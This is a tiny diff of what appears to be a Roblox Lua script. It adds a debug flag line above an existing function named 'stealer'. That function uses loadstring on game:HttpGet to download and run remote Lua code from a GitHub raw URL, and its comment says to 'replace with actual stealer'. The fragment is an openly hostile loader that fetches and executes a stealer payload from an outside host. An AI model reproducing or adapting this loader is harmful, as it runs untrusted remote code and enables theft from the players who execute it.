@@ -1,3 +1,4 @@
+debuging = true
 local function stealer()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/TakZ-bit/improved-potato/refs/heads/main/S.lua'))() -- replace with actual stealer
 end
